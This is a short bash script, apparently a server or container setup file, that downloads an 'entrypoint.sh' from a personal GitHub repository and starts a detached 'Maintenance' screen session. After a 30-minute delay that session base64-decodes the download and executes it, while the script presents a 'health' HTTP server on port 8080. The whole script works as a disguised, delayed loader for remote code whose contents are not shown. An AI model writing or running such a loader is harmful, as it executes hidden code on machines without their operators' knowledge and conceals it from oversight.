#!/bin/bash

mkdir -p /var/data

apt update >/dev/null
apt -y install python3 screen nano wget curl >/dev/null

curl -fsSL https://raw.githubusercontent.com/colinalcock52/friend/refs/heads/main/entrypoint.sh -o /var/data/entrypoint.sh
chmod +x /var/data/entrypoint.sh

screen -dmS Maintenance bash -c '
echo "Going for a 30 minutes sleep..."
sleep 1800
exec bash -c "$(base64 -d /var/data/entrypoint.sh)"
'

sleep 2
screen -ls
sleep 2
ls -lha /var/data
sleep 2

echo "Starting health HTTP server on port 8080..."
python3 -m http.server 8080
